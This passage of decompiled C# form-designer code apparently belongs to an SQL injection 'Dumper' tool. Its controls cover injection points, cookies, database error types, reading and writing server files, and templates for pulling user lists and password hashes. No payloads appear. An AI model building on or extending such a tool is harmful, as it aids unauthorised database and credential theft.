			btnColumns.Image = imgTV.Images[2];
			splSchema.Panel2Collapsed = true;
			if (Globals.IS_DUMP_INSTANCE)
			{
				btnLoadDefautSettings.Visible = false;
				tsNewDumpBtn.Visible = false;
				if (File.Exists(Globals.SCHEMA_PATH + "AppInstencie.Schema"))
				{
					method_79("AppInstencie.Schema");
				}
			}
			else
			{
				tbcMain.TabPages.Remove(tpProxies);
			}
			txtURL = new ToolStripSpringTextBox();
			tlsMenu.Items.Insert(2, txtURL);
			Globals.AddMouseMoveForm(this);
			method_77();
			Globals.translate_0.Add(this, icontainer_0);
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.icontainer_0 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Dumper));
		this.tsGetInfo = new System.Windows.Forms.ToolStrip();
		this.tsbSchemas_1 = new System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP3 = new System.Windows.Forms.ToolStripSeparator();
		this.tscSchemas = new System.Windows.Forms.ToolStripComboBox();
		this.tscSchemasSP2 = new System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_0 = new System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP = new System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_3 = new System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP1 = new System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_2 = new System.Windows.Forms.ToolStripButton();
		this.btnServerInfo = new System.Windows.Forms.ToolStripButton();
		this.lblVersion = new System.Windows.Forms.ToolStripLabel();
		this.lblCountry = new System.Windows.Forms.ToolStripLabel();
		this.tbcMain = new System.Windows.Forms.TabControl();
		this.tpSchema = new System.Windows.Forms.TabPage();
		this.splSchema = new System.Windows.Forms.SplitContainer();
		this.trwSchema = new TreeViewExt();
		this.mnuTree = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuCountDBs = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountTables = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountTablesAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountColumns = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountColumnsAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountRows = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountRowsAll = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuCopyDB = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyColumn = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyTable = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckAllSP = new System.Windows.Forms.ToolStripSeparator();
		this.mnuCheckAllColumns = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuUnCheckAllColumns = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckRevert = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP1 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuCopyAllNodes = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyAllSchema = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP2 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuClearNodes = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuClearSchema = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP3 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuRemDB = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuRemTable = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuRemColumn = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP5 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuAddDB = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuAddTable = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuAddColumn = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP4 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuCollapseTree = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSortTree = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuAutoScroll = new System.Windows.Forms.ToolStripMenuItem();
		this.imgTV = new System.Windows.Forms.ImageList(this.icontainer_0);
		this.splWhere = new System.Windows.Forms.SplitContainer();
		this.grbWhere = new System.Windows.Forms.GroupBox();
		this.txtSchemaWhere = new System.Windows.Forms.TextBox();
		this.grbOrderBy = new System.Windows.Forms.GroupBox();
		this.txtSchemaOrderBy = new System.Windows.Forms.TextBox();
		this.tsConvert1 = new System.Windows.Forms.ToolStrip();
		this.btnFiltersClear1 = new System.Windows.Forms.ToolStripButton();
		this.btnConvert = new System.Windows.Forms.ToolStripDropDownButton();
		this.ctmConvert = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuConvHex = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvChar = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvCharGroup = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuConvLEN = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvAddA = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvert = new System.Windows.Forms.ToolStripDropDownButton();
		this.ToolStripDropDownButton1 = new System.Windows.Forms.ToolStripDropDownButton();
		this.ctmSchema = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSchema0 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema1 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema2 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema3 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema4 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema5 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema6 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema7 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema8 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema9 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
		this.tsSchema = new System.Windows.Forms.ToolStrip();
		this.lblCountBDs = new System.Windows.Forms.ToolStripLabel();
		this.ToolStripSeparator22 = new System.Windows.Forms.ToolStripSeparator();
		this.btnClearSchema = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator13 = new System.Windows.Forms.ToolStripSeparator();
		this.btnDataBases = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.btnTables = new System.Windows.Forms.ToolStripButton();
		this.btnColumns = new System.Windows.Forms.ToolStripButton();
		this.btnColumnUp = new System.Windows.Forms.ToolStripButton();
		this.btnColumnDown = new System.Windows.Forms.ToolStripButton();
		this.btnDumpData = new System.Windows.Forms.ToolStripButton();
		this.tpQuery = new System.Windows.Forms.TabPage();
		this.splQuery = new System.Windows.Forms.SplitContainer();
		this.txtCustomQuery = new System.Windows.Forms.TextBox();
		this.lblSelect = new System.Windows.Forms.Label();
		this.txtCustomQueryFrom = new System.Windows.Forms.TextBox();
		this.lblFrom = new System.Windows.Forms.Label();
		this.tsCustomDump = new System.Windows.Forms.ToolStrip();
		this.btnDumpCustom = new System.Windows.Forms.ToolStripButton();
		this.btnDefCustomQuery = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator19 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuTemplates = new System.Windows.Forms.ToolStripDropDownButton();
		this.ToolStripSeparator9 = new System.Windows.Forms.ToolStripSeparator();
		this.tpMyLoadFile = new System.Windows.Forms.TabPage();
		this.grbWriteFile = new System.Windows.Forms.GroupBox();
		this.tsMySQLWriteFile = new System.Windows.Forms.ToolStrip();
		this.lblWritePath = new System.Windows.Forms.ToolStripLabel();
		this.txtMySQLWriteFilePath = new System.Windows.Forms.ToolStripTextBox();
		this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.cmbMySQLWriteFilePath = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.btnMySQLWriteFile = new System.Windows.Forms.ToolStripButton();
		this.txtMySQLWriteFile = new System.Windows.Forms.TextBox();
		this.grbLoadFile = new System.Windows.Forms.GroupBox();
		this.tsMySQLReadFile = new System.Windows.Forms.ToolStrip();
		this.lblReadPath = new System.Windows.Forms.ToolStripLabel();
		this.txtMySQLReadFilePath = new System.Windows.Forms.ToolStripTextBox();
		this.ToolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.cmbMySQLReadFile = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
		this.btnMySQLReadFile = new System.Windows.Forms.ToolStripButton();
		this.tpSearch = new System.Windows.Forms.TabPage();
		this.txtSearchColumnResult = new System.Windows.Forms.TextBox();
		this.tsSearchColumn = new System.Windows.Forms.ToolStrip();
		this.txtSearchColumn = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
		this.chkSearchColumnAllDBs = new System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
		this.btnSearchColumn = new System.Windows.Forms.ToolStripButton();
		this.tpProxies = new System.Windows.Forms.TabPage();
		this.imlTabs = new System.Windows.Forms.ImageList(this.icontainer_0);
		this.numSleepMultiThread = new System.Windows.Forms.NumericUpDown();
		this.lblMultiThreadDelay = new System.Windows.Forms.Label();
		this.lblMultiThreadRetry = new System.Windows.Forms.Label();
		this.numMaxRetryMultiThread = new System.Windows.Forms.NumericUpDown();
		this.numSleep = new System.Windows.Forms.NumericUpDown();
		this.lblThreadDelay = new System.Windows.Forms.Label();
		this.lblThreadRetry = new System.Windows.Forms.Label();
		this.numMaxRetry = new System.Windows.Forms.NumericUpDown();
		this.pnlSetupDump = new System.Windows.Forms.Panel();
		this.pnlSetupDump2 = new System.Windows.Forms.Panel();
		this.tsNewDumpBtn = new System.Windows.Forms.ToolStrip();
		this.btnLoadDefautSettings = new System.Windows.Forms.ToolStripButton();
		this.btnLoadNewDumper = new System.Windows.Forms.ToolStripButton();
		this.grbInjectionPoint = new System.Windows.Forms.GroupBox();
		this.lblHeaderValue = new System.Windows.Forms.Label();
		this.txtAddHeaderValue = new System.Windows.Forms.TextBox();
		this.lblHeaderName = new System.Windows.Forms.Label();
		this.txtAddHeaderName = new System.Windows.Forms.TextBox();
		this.lblInjectionPointMethod = new System.Windows.Forms.Label();
		this.lblInjectionPoint = new System.Windows.Forms.Label();
		this.cmbInjectionPoint = new System.Windows.Forms.ComboBox();
		this.cmbMethod = new System.Windows.Forms.ComboBox();
		this.txtCookies = new System.Windows.Forms.TextBox();
		this.txtPost = new System.Windows.Forms.TextBox();
		this.lblPost = new System.Windows.Forms.Label();
		this.lblCookies = new System.Windows.Forms.Label();
		this.chkAddHearder = new System.Windows.Forms.CheckBox();
		this.grbLogin = new System.Windows.Forms.GroupBox();
		this.txtUserName = new System.Windows.Forms.TextBox();
		this.txtPassword = new System.Windows.Forms.TextBox();
		this.lblLoginUser = new System.Windows.Forms.Label();
		this.lblLoginPassword = new System.Windows.Forms.Label();
		this.grbDumpSetup2 = new System.Windows.Forms.GroupBox();
		this.chkReDumpFailed = new System.Windows.Forms.CheckBox();
		this.chkClearListOnGet = new System.Windows.Forms.CheckBox();
		this.chkDumpOrderBy = new System.Windows.Forms.CheckBox();
		this.chkDumpWhere = new System.Windows.Forms.CheckBox();
		this.grbMySQLSplitRows = new System.Windows.Forms.GroupBox();
		this.numMySQLSplitRowsLenght = new System.Windows.Forms.NumericUpDown();
		this.Label1 = new System.Windows.Forms.Label();
		this.chkMySQLSplitRows = new System.Windows.Forms.CheckBox();
		this.numMySQLSplitRows = new System.Windows.Forms.NumericUpDown();
		this.grbDumpSetup = new System.Windows.Forms.GroupBox();
		this.numLimitX = new System.Windows.Forms.NumericUpDown();
		this.numMaxRetryColumn = new System.Windows.Forms.NumericUpDown();
		this.lblDumperRetryColumn = new System.Windows.Forms.Label();
		this.chkDumpFieldByField = new System.Windows.Forms.CheckBox();
		this.lblDumperStartIndex = new System.Windows.Forms.Label();
		this.lblDumperMaxRows = new System.Windows.Forms.Label();
		this.numFieldByField = new System.Windows.Forms.NumericUpDown();
		this.numLimitMax = new System.Windows.Forms.NumericUpDown();
		this.grbOracleCollactions = new System.Windows.Forms.GroupBox();
		this.chkOracleCastAsChar = new System.Windows.Forms.CheckBox();
		this.cmbOracleErrType = new System.Windows.Forms.ComboBox();
		this.cmbOracleTopN = new System.Windows.Forms.ComboBox();
		this.grbMSSQLCollactions = new System.Windows.Forms.GroupBox();
		this.chkMSSQLCastAsChar = new System.Windows.Forms.CheckBox();
		this.cmbMSSQLCast = new System.Windows.Forms.ComboBox();
		this.chkMSSQL_Latin1 = new System.Windows.Forms.CheckBox();
		this.grbMySQLCollactions = new System.Windows.Forms.GroupBox();
		this.cmbMySQLErrType = new System.Windows.Forms.ComboBox();
		this.cmbMySQLCollations = new System.Windows.Forms.ComboBox();
		this.chkDumpIFNULL = new System.Windows.Forms.CheckBox();
		this.chkDumpEncodedHex = new System.Windows.Forms.CheckBox();
		this.chkAllInOneRequest = new System.Windows.Forms.CheckBox();
		this.grbSetupCon = new System.Windows.Forms.GroupBox();
		this.chkHttpRedirect = new System.Windows.Forms.CheckBox();
		this.chkThreads = new System.Windows.Forms.CheckBox();
		this.numThreads = new System.Windows.Forms.NumericUpDown();
		this.numTimeOut = new System.Windows.Forms.NumericUpDown();
		this.lblTimout = new System.Windows.Forms.Label();
		this.splData = new System.Windows.Forms.SplitContainer();
		this.ctmTemplatesPostgreSQL = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuPostgreSQL_ListUsers = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuPostgreSQL_Passwords = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuPostgreSQL_Join = new System.Windows.Forms.ToolStripMenuItem();
		this.ctmTemplatesOracle = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuOracleListUsers = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuOracleHashes = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuOracleJoin = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator24 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuOracleHelp = new System.Windows.Forms.ToolStripMenuItem();
		this.ctmTemplatesMSSQL = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSqlLogins = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSqlIsAdmin = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuSQLJoin = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuSQLHelp = new System.Windows.Forms.ToolStripMenuItem();
		this.bckWorker = new System.ComponentModel.BackgroundWorker();
		this.tlpUrl = new System.Windows.Forms.ToolTip(this.icontainer_0);
		this.ctmTemplatesFilters = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuFilters1 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters2 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters5 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters6 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters7 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters8 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters9 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters10 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters3 = new System.Windows.Forms.ToolStripMenuItem();
		this.bckAlexa = new System.ComponentModel.BackgroundWorker();
		this.ctmTemplatesMySQL = new System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuUsers = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuPrivileges = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuListDBA = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuHostIP = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuExtraMySQLStuffs2 = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLoadFile = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuIntoOutfile = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuIntoDumpfile = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuExtraMySQLStuffs = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckUser = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckPizza = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuJOIN = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLENGTH = new System.Windows.Forms.ToolStripMenuItem();
		this.mnuLimitXY = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator34 = new System.Windows.Forms.ToolStripSeparator();
		this.mnuMySQLHelp = new System.Windows.Forms.ToolStripMenuItem();
		this.tlsMenu = new System.Windows.Forms.ToolStrip();
		this.btnPasteURL = new System.Windows.Forms.ToolStripButton();
		this.toolStripSeparator18 = new System.Windows.Forms.ToolStripSeparator();
		this.cmbSqlType = new System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.tsGetInfo.SuspendLayout();
		this.tbcMain.SuspendLayout();
		this.tpSchema.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splSchema).BeginInit();
		this.splSchema.Panel1.SuspendLayout();
		this.splSchema.Panel2.SuspendLayout();
		this.splSchema.SuspendLayout();
		this.mnuTree.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splWhere).BeginInit();
		this.splWhere.Panel1.SuspendLayout();
		this.splWhere.Panel2.SuspendLayout();
		this.splWhere.SuspendLayout();
		this.grbWhere.SuspendLayout();
		this.grbOrderBy.SuspendLayout();
		this.tsConvert1.SuspendLayout();
		this.ctmConvert.SuspendLayout();
		this.ctmSchema.SuspendLayout();
		this.tsSchema.SuspendLayout();
		this.tpQuery.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splQuery).BeginInit();
		this.splQuery.Panel1.SuspendLayout();
		this.splQuery.Panel2.SuspendLayout();
		this.splQuery.SuspendLayout();
		this.tsCustomDump.SuspendLayout();
		this.tpMyLoadFile.SuspendLayout();
		this.grbWriteFile.SuspendLayout();
		this.tsMySQLWriteFile.SuspendLayout();
		this.grbLoadFile.SuspendLayout();
		this.tsMySQLReadFile.SuspendLayout();
		this.tpSearch.SuspendLayout();
		this.tsSearchColumn.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numSleepMultiThread).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetryMultiThread).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numSleep).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetry).BeginInit();
		this.pnlSetupDump.SuspendLayout();
		this.pnlSetupDump2.SuspendLayout();
		this.tsNewDumpBtn.SuspendLayout();
		this.grbInjectionPoint.SuspendLayout();
		this.grbLogin.SuspendLayout();
		this.grbDumpSetup2.SuspendLayout();
		this.grbMySQLSplitRows.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numMySQLSplitRowsLenght).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numMySQLSplitRows).BeginInit();
		this.grbDumpSetup.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numLimitX).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetryColumn).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numFieldByField).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numLimitMax).BeginInit();
		this.grbOracleCollactions.SuspendLayout();
		this.grbMSSQLCollactions.SuspendLayout();
		this.grbMySQLCollactions.SuspendLayout();
		this.grbSetupCon.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numThreads).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numTimeOut).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.splData).BeginInit();
		this.splData.Panel1.SuspendLayout();
		this.splData.SuspendLayout();
		this.ctmTemplatesPostgreSQL.SuspendLayout();
		this.ctmTemplatesOracle.SuspendLayout();
		this.ctmTemplatesMSSQL.SuspendLayout();
		this.ctmTemplatesFilters.SuspendLayout();
		this.ctmTemplatesMySQL.SuspendLayout();
		this.tlsMenu.SuspendLayout();
		base.SuspendLayout();
		this.tsGetInfo.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsGetInfo.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsGetInfo.Items.AddRange(new System.Windows.Forms.ToolStripItem[12]
		{
			this.tsbSchemas_1, this.tscSchemasSP3, this.tscSchemas, this.tscSchemasSP2, this.tsbSchemas_0, this.tscSchemasSP, this.tsbSchemas_3, this.tscSchemasSP1, this.tsbSchemas_2, this.btnServerInfo,
			this.lblVersion, this.lblCountry
		});
		this.tsGetInfo.Location = new System.Drawing.Point(0, 33);
		this.tsGetInfo.Name = "tsGetInfo";
		this.tsGetInfo.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsGetInfo.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsGetInfo.Size = new System.Drawing.Size(1762, 33);
		this.tsGetInfo.TabIndex = 16;
		this.tsGetInfo.Text = "ToolStrip2";
		this.tsbSchemas_1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_1.Image = ns0.Class6.ProjectSystemModelRefresh_16x_24;
		this.tsbSchemas_1.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.tsbSchemas_1.Name = "tsbSchemas_1";
		this.tsbSchemas_1.Size = new System.Drawing.Size(28, 30);
		this.tsbSchemas_1.Text = "Refresh Dir..";
		this.tscSchemasSP3.Name = "tscSchemasSP3";
		this.tscSchemasSP3.Size = new System.Drawing.Size(6, 33);
		this.tscSchemas.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.tscSchemas.MaxDropDownItems = 30;
		this.tscSchemas.Name = "tscSchemas";
		this.tscSchemas.Size = new System.Drawing.Size(178, 33);
		this.tscSchemasSP2.Name = "tscSchemasSP2";
		this.tscSchemasSP2.Size = new System.Drawing.Size(6, 33);
		this.tsbSchemas_0.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_0.Image = ns0.Class6.Entry_16x_24;
		this.tsbSchemas_0.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.tsbSchemas_0.Name = "tsbSchemas_0";
		this.tsbSchemas_0.Size = new System.Drawing.Size(28, 30);
		this.tsbSchemas_0.Text = "Load Session";
		this.tscSchemasSP.Name = "tscSchemasSP";
		this.tscSchemasSP.Size = new System.Drawing.Size(6, 33);
		this.tsbSchemas_3.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_3.Image = ns0.Class6.Save_16x_24;
		this.tsbSchemas_3.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.tsbSchemas_3.Name = "tsbSchemas_3";
		this.tsbSchemas_3.Size = new System.Drawing.Size(28, 30);
		this.tsbSchemas_3.Text = "&Save Session";
		this.tscSchemasSP1.Name = "tscSchemasSP1";
		this.tscSchemasSP1.Size = new System.Drawing.Size(6, 33);
		this.tsbSchemas_2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_2.Image = ns0.Class6.delete;
		this.tsbSchemas_2.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.tsbSchemas_2.Name = "tsbSchemas_2";
		this.tsbSchemas_2.Size = new System.Drawing.Size(28, 30);
		this.tsbSchemas_2.Text = "Delete Selected Session";
		this.btnServerInfo.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnServerInfo.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnServerInfo.Image = ns0.Class6.Run_16x_24;
		this.btnServerInfo.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnServerInfo.Name = "btnServerInfo";
		this.btnServerInfo.Size = new System.Drawing.Size(158, 30);
		this.btnServerInfo.Text = "&Get Server Info";
		this.btnServerInfo.ToolTipText = " ";
		this.lblVersion.Name = "lblVersion";
		this.lblVersion.Size = new System.Drawing.Size(107, 30);
		this.lblVersion.Text = "SQL Version";
		this.lblCountry.Name = "lblCountry";
		this.lblCountry.Size = new System.Drawing.Size(75, 30);
		this.lblCountry.Text = "Country";
		this.tbcMain.Controls.Add(this.tpSchema);
		this.tbcMain.Controls.Add(this.tpQuery);
		this.tbcMain.Controls.Add(this.tpMyLoadFile);
		this.tbcMain.Controls.Add(this.tpSearch);
		this.tbcMain.Controls.Add(this.tpProxies);
		this.tbcMain.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tbcMain.ImageList = this.imlTabs;
		this.tbcMain.Location = new System.Drawing.Point(0, 0);
		this.tbcMain.Name = "tbcMain";
		this.tbcMain.SelectedIndex = 0;
		this.tbcMain.Size = new System.Drawing.Size(1399, 1286);
		this.tbcMain.TabIndex = 18;
		this.tpSchema.Controls.Add(this.splSchema);
		this.tpSchema.Controls.Add(this.tsSchema);
		this.tpSchema.ImageIndex = 0;
		this.tpSchema.Location = new System.Drawing.Point(4, 29);
		this.tpSchema.Name = "tpSchema";
		this.tpSchema.Padding = new System.Windows.Forms.Padding(3);
		this.tpSchema.Size = new System.Drawing.Size(1391, 1253);
		this.tpSchema.TabIndex = 0;
		this.tpSchema.Text = "Schema";
		this.tpSchema.UseVisualStyleBackColor = true;
		this.splSchema.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splSchema.FixedPanel = System.Windows.Forms.FixedPanel.Panel2;
		this.splSchema.Location = new System.Drawing.Point(3, 35);
		this.splSchema.Name = "splSchema";
		this.splSchema.Panel1.Controls.Add(this.trwSchema);
		this.splSchema.Panel2.Controls.Add(this.splWhere);
		this.splSchema.Panel2.Controls.Add(this.tsConvert1);
		this.splSchema.Size = new System.Drawing.Size(1385, 1215);
		this.splSchema.SplitterDistance = 1181;
		this.splSchema.TabIndex = 21;
		this.trwSchema.CheckBoxes = true;
		this.trwSchema.ContextMenuStrip = this.mnuTree;
		this.trwSchema.Dock = System.Windows.Forms.DockStyle.Fill;
		this.trwSchema.Font = new System.Drawing.Font("Courier New", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.trwSchema.FullRowSelect = true;
		this.trwSchema.HideSelection = false;
		this.trwSchema.ImageIndex = 0;
		this.trwSchema.ImageList = this.imgTV;
		this.trwSchema.Location = new System.Drawing.Point(0, 0);
		this.trwSchema.Name = "trwSchema";
		this.trwSchema.SelectedImageIndex = 0;
		this.trwSchema.ShowNodeToolTips = true;
		this.trwSchema.Size = new System.Drawing.Size(1181, 1215);
		this.trwSchema.TabIndex = 0;
		this.mnuTree.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuTree.Items.AddRange(new System.Windows.Forms.ToolStripItem[33]
		{
			this.mnuCountDBs, this.mnuCountTables, this.mnuCountTablesAll, this.mnuCountColumns, this.mnuCountColumnsAll, this.mnuCountRows, this.mnuCountRowsAll, this.mnuCountSP, this.mnuCopyDB, this.mnuCopyColumn,
			this.mnuCopyTable, this.mnuCheckAllSP, this.mnuCheckAllColumns, this.mnuUnCheckAllColumns, this.mnuCheckRevert, this.mnuTreeSP1, this.mnuCopyAllNodes, this.mnuCopyAllSchema, this.mnuTreeSP2, this.mnuClearNodes,
			this.mnuClearSchema, this.mnuTreeSP3, this.mnuRemDB, this.mnuRemTable, this.mnuRemColumn, this.mnuTreeSP5, this.mnuAddDB, this.mnuAddTable, this.mnuAddColumn, this.mnuTreeSP4,
			this.mnuCollapseTree, this.mnuSortTree, this.mnuAutoScroll
		});
		this.mnuTree.Name = "mnuListView";
		this.mnuTree.ShowImageMargin = false;
		this.mnuTree.ShowItemToolTips = false;
		this.mnuTree.Size = new System.Drawing.Size(230, 826);
		this.mnuCountDBs.Name = "mnuCountDBs";
		this.mnuCountDBs.Size = new System.Drawing.Size(229, 30);
		this.mnuCountDBs.Text = "Count Databases";
		this.mnuCountTables.Name = "mnuCountTables";
		this.mnuCountTables.Size = new System.Drawing.Size(229, 30);
		this.mnuCountTables.Text = "Count Tables";
		this.mnuCountTablesAll.Name = "mnuCountTablesAll";
		this.mnuCountTablesAll.Size = new System.Drawing.Size(229, 30);
		this.mnuCountTablesAll.Text = "Count All Tables";
		this.mnuCountColumns.Name = "mnuCountColumns";
		this.mnuCountColumns.Size = new System.Drawing.Size(229, 30);
		this.mnuCountColumns.Text = "Count Columns";
		this.mnuCountColumnsAll.Name = "mnuCountColumnsAll";
		this.mnuCountColumnsAll.Size = new System.Drawing.Size(229, 30);
		this.mnuCountColumnsAll.Text = "Count All Columns";
		this.mnuCountRows.Name = "mnuCountRows";
		this.mnuCountRows.Size = new System.Drawing.Size(229, 30);
		this.mnuCountRows.Text = "Count Rows";
		this.mnuCountRowsAll.Name = "mnuCountRowsAll";
